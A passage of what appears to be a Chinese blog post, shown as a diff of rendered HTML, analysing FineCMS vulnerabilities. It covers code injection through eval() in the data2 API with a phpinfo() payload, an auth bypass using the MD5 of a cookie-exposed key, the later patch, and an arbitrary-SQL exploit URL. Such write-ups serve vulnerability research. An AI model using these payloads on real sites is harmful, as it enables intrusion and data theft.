+</span><span class="c1"></span>            <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;callback&#39;</span><span class="p">,</span> <span class="k">TRUE</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;(&#39;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">callback_json</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;)&#39;</span><span class="p">;</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="c1">// 自定义返回名称
+</span><span class="c1"></span>            <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">callback_json</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="k">exit</span><span class="p">;</span>
+
+	<span class="p">}</span>
+</code></pre></div><p>可以看到开头这里验证了认证码：</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="c1">// 安全码认证
+</span><span class="c1"></span>    <span class="nv">$auth</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">input</span><span class="o">-&gt;</span><span class="na">get</span><span class="p">(</span><span class="s1">&#39;auth&#39;</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$auth</span> <span class="o">!=</span> <span class="nx">md5</span><span class="p">(</span><span class="nx">SYS_KEY</span><span class="p">))</span> <span class="p">{</span>
+        <span class="c1">// 授权认证码不正确
+</span><span class="c1"></span>        <span class="nv">$data</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;msg&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;授权认证码不正确&#39;</span><span class="p">,</span> <span class="s1">&#39;code&#39;</span> <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</code></pre></div><p>授权码在<code>/config/system.php</code>
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/finecms11/4.png" alt="">
+可以看到<code>SYS_KEY</code>是固定的，我们可以在Cookies找到，<code>/finecms/dayrui/config/config.php</code>
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/finecms11/5.png" alt="">
+用浏览器查看Cookies可以看到KEY，但是验证用MD5，我们先把KEY加密就行了。
+<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/finecms11/6.png" alt=""></p>
+<p>直接看到这一段，调用了<code>Template</code>对象里面的<code>list_tag</code>函数</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
+
+                <span class="c1">// list数据查询
+</span><span class="c1"></span>                <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">template</span><span class="o">-&gt;</span><span class="na">list_tag</span><span class="p">(</span><span class="nv">$param</span><span class="p">);</span>
+                <span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;code&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;error&#39;</span><span class="p">]</span> <span class="o">?</span> <span class="mi">0</span> <span class="o">:</span> <span class="mi">1</span><span class="p">;</span>
+                <span class="nx">unset</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;sql&#39;</span><span class="p">],</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;pages&#39;</span><span class="p">]);</span>
+
+                <span class="c1">// 缓存数据
+</span><span class="c1"></span>                <span class="nv">$cache</span> <span class="o">&amp;&amp;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">set_cache_data</span><span class="p">(</span><span class="nv">$cache</span><span class="p">,</span> <span class="nv">$data</span><span class="p">,</span> <span class="nv">$param</span><span class="p">[</span><span class="s1">&#39;cache&#39;</span><span class="p">]);</span>
+            <span class="p">}</span>
+</code></pre></div><p>我们到<code>finecms/dayrui/libraries/Template.php</code>看<code>list_tag</code>函数的代码,代码有点长，我抓重点的地方,这里把<code>param=action=cache%20name=MEMBER.1%27];phpinfo();$a=[%271</code>的内容分为两个数组<code>$var</code>、<code>$val</code>，这两个数组的内容分别为</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$var=[&#39;action&#39;,&#39;name&#39;]
+$val=[&#39;cache%20&#39;,&#39;MEMBER.1%27];phpinfo();$a=[%271&#39;]
+</code></pre></div><p><code>$cache=_cache_var</code>是返回会员的信息
+重点的是下面的 <code> @eval('$data=$cache'.$this-&gt;_get_var($_param).';');</code></p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="k">foreach</span> <span class="p">(</span><span class="nv">$params</span> <span class="k">as</span> <span class="nv">$t</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$var</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$t</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">strpos</span><span class="p">(</span><span class="nv">$t</span><span class="p">,</span> <span class="s1">&#39;=&#39;</span><span class="p">));</span>
+            <span class="nv">$val</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$t</span><span class="p">,</span> <span class="nx">strpos</span><span class="p">(</span><span class="nv">$t</span><span class="p">,</span> <span class="s1">&#39;=&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+</code></pre></div><p>再看这一段,因为<code>swtich</code>选中的是<code>cache</code>，所有就不再进行下面的分析了。
+<code>$pos = strpos($param['name'], '.');</code>这句是为下面的<code>substr</code>函数做准备。
+是为了分离出的内容为</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$_name=&#39;MEMBER&#39;
+$_param=&#34;1%27];phpinfo();$a=[%271&#34;
+</code></pre></div><div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"> <span class="c1">// action
+</span><span class="c1"></span>        <span class="k">switch</span> <span class="p">(</span><span class="nv">$system</span><span class="p">[</span><span class="s1">&#39;action&#39;</span><span class="p">])</span> <span class="p">{</span>
+
+            <span class="k">case</span> <span class="s1">&#39;cache&#39;</span><span class="o">:</span> <span class="c1">// 系统缓存数据
+</span><span class="c1"></span>                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$param</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]))</span> <span class="p">{</span>
+                    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_return</span><span class="p">(</span><span class="nv">$system</span><span class="p">[</span><span class="s1">&#39;return&#39;</span><span class="p">],</span> <span class="s1">&#39;name参数不存在&#39;</span><span class="p">);</span>
+                <span class="p">}</span>
+
+                <span class="nv">$pos</span> <span class="o">=</span> <span class="nx">strpos</span><span class="p">(</span><span class="nv">$param</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">],</span> <span class="s1">&#39;.&#39;</span><span class="p">);</span>
+                <span class="k">if</span> <span class="p">(</span><span class="nv">$pos</span> <span class="o">!==</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="nv">$_name</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$param</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">],</span> <span class="mi">0</span><span class="p">,</span> <span class="nv">$pos</span><span class="p">);</span>
+                    <span class="nv">$_param</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$param</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">],</span> <span class="nv">$pos</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                    <span class="nv">$_name</span> <span class="o">=</span> <span class="nv">$param</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
+                    <span class="nv">$_param</span> <span class="o">=</span> <span class="k">NULL</span><span class="p">;</span>
+                <span class="p">}</span>
+                <span class="nv">$cache</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_cache_var</span><span class="p">(</span><span class="nv">$_name</span><span class="p">,</span> <span class="o">!</span><span class="nv">$system</span><span class="p">[</span><span class="s1">&#39;site&#39;</span><span class="p">]</span> <span class="o">?</span> <span class="nx">SITE_ID</span> <span class="o">:</span> <span class="nv">$system</span><span class="p">[</span><span class="s1">&#39;site&#39;</span><span class="p">]);</span>
+                <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$cache</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_return</span><span class="p">(</span><span class="nv">$system</span><span class="p">[</span><span class="s1">&#39;return&#39;</span><span class="p">],</span> <span class="s2">&#34;缓存(</span><span class="si">{</span><span class="nv">$_name</span><span class="si">}</span><span class="s2">)不存在，请在后台更新缓存&#34;</span><span class="p">);</span>
+                <span class="p">}</span>
+                <span class="k">if</span> <span class="p">(</span><span class="nv">$_param</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="nv">$data</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
+                    <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="s1">&#39;$data=$cache&#39;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_get_var</span><span class="p">(</span><span class="nv">$_param</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;;&#39;</span><span class="p">);</span>
+                    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
+                        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_return</span><span class="p">(</span><span class="nv">$system</span><span class="p">[</span><span class="s1">&#39;return&#39;</span><span class="p">],</span> <span class="s2">&#34;缓存(</span><span class="si">{</span><span class="nv">$_name</span><span class="si">}</span><span class="s2">)参数不存在!!&#34;</span><span class="p">);</span>
+                    <span class="p">}</span>
+                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                    <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$cache</span><span class="p">;</span>
+                <span class="p">}</span>
+
+                <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_return</span><span class="p">(</span><span class="nv">$system</span><span class="p">[</span><span class="s1">&#39;return&#39;</span><span class="p">],</span> <span class="nv">$data</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
+                <span class="k">break</span><span class="p">;</span>
+</code></pre></div><p>跟踪<code>get_var</code>函数，在这里我们先把<code>$param</code>的内容假设为a,然后执行函数里面的内容，最后返回的<code>$string</code>的内容是：
+<code>$string=['a']</code>
+那么我们的思路就是把两边的[' &lsquo;]闭合然后再放上恶意的代码。
+payload为：<code>1'];phpinfo();$a=['1</code>
+那么返回的<code>$string</code>的内容：
+<code>$string=['1'];phpinfo();$a=['1']</code></p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="k">public</span> <span class="k">function</span> <span class="nf">_get_var</span><span class="p">(</span><span class="nv">$param</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$array</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="nv">$param</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$array</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="nv">$string</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$array</span> <span class="k">as</span> <span class="nv">$var</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$string</span><span class="o">.=</span> <span class="s1">&#39;[&#39;</span><span class="p">;</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$var</span><span class="p">,</span> <span class="s1">&#39;$&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nv">$string</span><span class="o">.=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/\[(.+)\]/U&#39;</span><span class="p">,</span> <span class="s1">&#39;[\&#39;\\1\&#39;]&#39;</span><span class="p">,</span> <span class="nv">$var</span><span class="p">);</span>
+            <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[A-Z_]+/&#39;</span><span class="p">,</span> <span class="nv">$var</span><span class="p">))</span> <span class="p">{</span>
+                <span class="nv">$string</span><span class="o">.=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="nv">$var</span><span class="o">.</span><span class="s1">&#39;&#39;</span><span class="p">;</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                <span class="nv">$string</span><span class="o">.=</span> <span class="s1">&#39;\&#39;&#39;</span><span class="o">.</span><span class="nv">$var</span><span class="o">.</span><span class="s1">&#39;\&#39;&#39;</span><span class="p">;</span>
+            <span class="p">}</span>
+            <span class="nv">$string</span><span class="o">.=</span> <span class="s1">&#39;]&#39;</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="k">return</span> <span class="nv">$string</span><span class="p">;</span>
+    <span class="p">}</span>
+</code></pre></div><p>修复后的<code>_get_var</code>函数里面多了一个<code>dr_safe_replace</code>过滤函数，然后<code>data2()</code>删除了。</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"> <span class="k">public</span> <span class="k">function</span> <span class="nf">_get_var</span><span class="p">(</span><span class="nv">$param</span><span class="p">)</span> <span class="p">{</span>
+
+        <span class="nv">$array</span> <span class="o">=</span> <span class="nx">explode</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="nv">$param</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$array</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="nv">$string</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$array</span> <span class="k">as</span> <span class="nv">$var</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nv">$var</span> <span class="o">=</span> <span class="nx">dr_safe_replace</span><span class="p">(</span><span class="nv">$var</span><span class="p">);</span>
+            <span class="nv">$string</span><span class="o">.=</span> <span class="s1">&#39;[&#39;</span><span class="p">;</span>
+            <span class="k">if</span> <span class="p">(</span><span class="nx">strpos</span><span class="p">(</span><span class="nv">$var</span><span class="p">,</span> <span class="s1">&#39;$&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nv">$string</span><span class="o">.=</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/\[(.+)\]/U&#39;</span><span class="p">,</span> <span class="s1">&#39;[\&#39;\\1\&#39;]&#39;</span><span class="p">,</span> <span class="nv">$var</span><span class="p">);</span>
+            <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[A-Z_]+/&#39;</span><span class="p">,</span> <span class="nv">$var</span><span class="p">))</span> <span class="p">{</span>
+                <span class="nv">$string</span><span class="o">.=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="nv">$var</span><span class="o">.</span><span class="s1">&#39;&#39;</span><span class="p">;</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                <span class="nv">$string</span><span class="o">.=</span> <span class="s1">&#39;\&#39;&#39;</span><span class="o">.</span><span class="nv">$var</span><span class="o">.</span><span class="s1">&#39;\&#39;&#39;</span><span class="p">;</span>
+            <span class="p">}</span>
+            <span class="nv">$string</span><span class="o">.=</span> <span class="s1">&#39;]&#39;</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="k">return</span> <span class="nv">$string</span><span class="p">;</span>
+    <span class="p">}</span>
+</code></pre></div><p><code>dr_safe_replace()</code></p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="k">function</span> <span class="nf">dr_safe_replace</span><span class="p">(</span><span class="nv">$string</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$string</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;%20&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
+    <span class="nv">$string</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;%27&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
+    <span class="nv">$string</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;%2527&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
+    <span class="nv">$string</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;*&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
+    <span class="nv">$string</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;&#34;&#39;</span><span class="p">,</span> <span class="s1">&#39;&amp;quot;&#39;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
+    <span class="nv">$string</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;&#39;&#34;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
+    <span class="nv">$string</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;&#34;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
+    <span class="nv">$string</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;;&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
+    <span class="nv">$string</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;&lt;&#39;</span><span class="p">,</span> <span class="s1">&#39;&amp;lt;&#39;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
+    <span class="nv">$string</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;&gt;&#39;</span><span class="p">,</span> <span class="s1">&#39;&amp;gt;&#39;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
+    <span class="nv">$string</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s2">&#34;{&#34;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
+    <span class="nv">$string</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;}&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$string</span><span class="p">);</span>
+    <span class="k">return</span> <span class="nv">$string</span><span class="p">;</span>
+<span class="p">}</span>
+
+</code></pre></div><h1 id="0x05-任意sql语句执行1">0x05 任意SQL语句执行1</h1>
+<h2 id="1漏洞复现-2">1.漏洞复现</h2>
+<p>浏览器：</p>
+<p><code>http://getpass1.cn/index.php?c=api&amp;m=data2&amp;auth=582f27d140497a9d8f048ca085b111df&amp;param=action=sql%20sql=%27select%20version();%27</code></p>
+<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/finecms11/7.png" alt=""></p>
+<h2 id="2漏洞分析-2">2.漏洞分析</h2>
+<p>这里就不用debug模式去跟进了，有不懂CI框架的数据库操作可以去看官方文档http://codeigniter.org.cn/user_guide/database/index.html</p>
+<p>问题一样出在<code>finecms/dayrui/controllers/Api.php</code>中的<code>data2()</code>,可以直接去看<code>finecms/dayrui/libraries/Template.php</code>里面的<code>list_tag()</code>函数</p>
+<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php">  <span class="k">case</span> <span class="s1">&#39;sql&#39;</span><span class="o">:</span> <span class="c1">// 直接sql查询
+</span><span class="c1"></span>
+                <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/sql=\&#39;(.+)\&#39;/sU&#39;</span><span class="p">,</span> <span class="nv">$_params</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">))</span> <span class="p">{</span>
+
+
+                    <span class="c1">// 数据源的选择
+</span><span class="c1"></span>                    <span class="nv">$db</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ci</span><span class="o">-&gt;</span><span class="na">db</span><span class="p">;</span>
+
+                    <span class="c1">// 替换前缀
+</span><span class="c1"></span>                    <span class="nv">$sql</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span>
+                        <span class="k">array</span><span class="p">(</span><span class="s1">&#39;@#S&#39;</span><span class="p">,</span> <span class="s1">&#39;@#&#39;</span><span class="p">),</span>
+                        <span class="k">array</span><span class="p">(</span><span class="nv">$db</span><span class="o">-&gt;</span><span class="na">dbprefix</span><span class="o">.</span><span class="nv">$system</span><span class="p">[</span><span class="s1">&#39;site&#39;</span><span class="p">],</span> <span class="nv">$db</span><span class="o">-&gt;</span><span class="na">dbprefix</span><span class="p">),</span>
+                        <span class="nx">trim</span><span class="p">(</span><span class="nx">urldecode</span><span class="p">(</span><span class="nv">$sql</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span>
+                    <span class="p">);</span>
+                    <span class="k">if</span> <span class="p">(</span><span class="nx">stripos</span><span class="p">(</span><span class="nv">$sql</span><span class="p">,</span> <span class="s1">&#39;SELECT&#39;</span><span class="p">)</span> <span class="o">!==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+                        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_return</span><span class="p">(</span><span class="nv">$system</span><span class="p">[</span><span class="s1">&#39;return&#39;</span><span class="p">],</span> <span class="s1">&#39;SQL语句只能是SELECT查询语句&#39;</span><span class="p">);</span>
+                    <span class="p">}</span>
+
+                    <span class="nv">$total</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+                    <span class="nv">$pages</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
+
+                    <span class="c1">// 如存在分页条件才进行分页查询
+</span><span class="c1"></span>                    <span class="k">if</span> <span class="p">(</span><span class="nv">$system</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nv">$system</span><span class="p">[</span><span class="s1">&#39;urlrule&#39;</span><span class="p">])</span> <span class="p">{</span>
+                        <span class="nv">$page</span> <span class="o">=</span> <span class="nx">max</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">]);</span>
+                        <span class="nv">$row</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_query</span><span class="p">(</span><span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/select \* from/iUs&#39;</span><span class="p">,</span> <span class="s1">&#39;SELECT count(*) as c FROM&#39;</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">),</span> <span class="nv">$system</span><span class="p">[</span><span class="s1">&#39;site&#39;</span><span class="p">],</span> <span class="nv">$system</span><span class="p">[</span><span class="s1">&#39;cache&#39;</span><span class="p">],</span> <span class="k">FALSE</span><span class="p">);</span>
+                        <span class="nv">$total</span> <span class="o">=</span> <span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;c&#39;</span><span class="p">];</span>
+                        <span class="nv">$pagesize</span> <span class="o">=</span> <span class="nv">$system</span><span class="p">[</span><span class="s1">&#39;pagesize&#39;</span><span class="p">]</span> <span class="o">?</span> <span class="nv">$system</span><span class="p">[</span><span class="s1">&#39;pagesize&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="mi">10</span><span class="p">;</span>
+                        <span class="c1">// 没有数据时返回空
+</span><span class="c1"></span>                        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$total</span><span class="p">)</span> <span class="p">{</span>
+                            <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_return</span><span class="p">(</span><span class="nv">$system</span><span class="p">[</span><span class="s1">&#39;return&#39;</span><span class="p">],</span> <span class="s1">&#39;没有查询到内容&#39;</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+                        <span class="p">}</span>
+                        <span class="nv">$sql</span><span class="o">.=</span> <span class="s1">&#39; LIMIT &#39;</span><span class="o">.</span><span class="nv">$pagesize</span> <span class="o">*</span> <span class="p">(</span><span class="nv">$page</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;,&#39;</span><span class="o">.</span><span class="nv">$pagesize</span><span class="p">;</span>
+                        <span class="nv">$pages</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_get_pagination</span><span class="p">(</span><span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;[page]&#39;</span><span class="p">,</span> <span class="s1">&#39;{page}&#39;</span><span class="p">,</span> <span class="nx">urldecode</span><span class="p">(</span><span class="nv">$system</span><span class="p">[</span><span class="s1">&#39;urlrule&#39;</span><span class="p">])),</span> <span class="nv">$pagesize</span><span class="p">,</span> <span class="nv">$total</span><span class="p">);</span>
+                    <span class="p">}</span>
+
+                    <span class="nv">$data</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">,</span> <span class="nv">$system</span><span class="p">[</span><span class="s1">&#39;site&#39;</span><span class="p">],</span> <span class="nv">$system</span><span class="p">[</span><span class="s1">&#39;cache&#39;</span><span class="p">]);</span>
+                    <span class="nv">$fields</span> <span class="o">=</span> <span class="k">NULL</span><span class="p">;</span>
+
+                    <span class="k">if</span> <span class="p">(</span><span class="nv">$system</span><span class="p">[</span><span class="s1">&#39;module&#39;</span><span class="p">])</span> <span class="p">{</span>
+                        <span class="nv">$fields</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ci</span><span class="o">-&gt;</span><span class="na">module</span><span class="p">[</span><span class="nv">$system</span><span class="p">[</span><span class="s1">&#39;module&#39;</span><span class="p">]][</span><span class="s1">&#39;field&#39;</span><span class="p">];</span> <span class="c1">// 模型主表的字段
+</span><span class="c1"></span>                    <span class="p">}</span>
+
+                    <span class="k">if</span> <span class="p">(</span><span class="nv">$fields</span><span class="p">)</span> <span class="p">{</span>
+                        <span class="c1">// 缓存查询结果
+</span><span class="c1"></span>                        <span class="nv">$name</span> <span class="o">=</span> <span class="s1">&#39;list-action-sql-&#39;</span><span class="o">.</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+                        <span class="nv">$cache</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">ci</span><span class="o">-&gt;</span><span class="na">get_cache_data</span><span class="p">(</span><span class="nv">$name</span><span class="p">);</span>
+                        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$cache</span> <span class="o">&amp;&amp;</span> <span class="nx">is_array</span><span class="p">(</span><span class="nv">$data</span><span class="p">))</span> <span class="p">{</span>
+                            <span class="c1">// 模型表的系统字段
+</span><span class="c1"></span>                            <span class="nv">$fields</span><span class="p">[</span><span class="s1">&#39;inputtime&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;fieldtype&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;Date&#39;</span><span class="p">);</span>
+                            <span class="nv">$fields</span><span class="p">[</span><span class="s1">&#39;updatetime&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;fieldtype&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;Date&#39;</span><span class="p">);</span>
+                            <span class="c1">// 格式化显示自定义字段内容
+</span><span class="c1"></span>                            <span class="k">foreach</span> <span class="p">(</span><span class="nv">$data</span> <span class="k">as</span> <span class="nv">$i</span> <span class="o">=&gt;</span> <span class="nv">$t</span><span class="p">)</span> <span class="p">{</span>
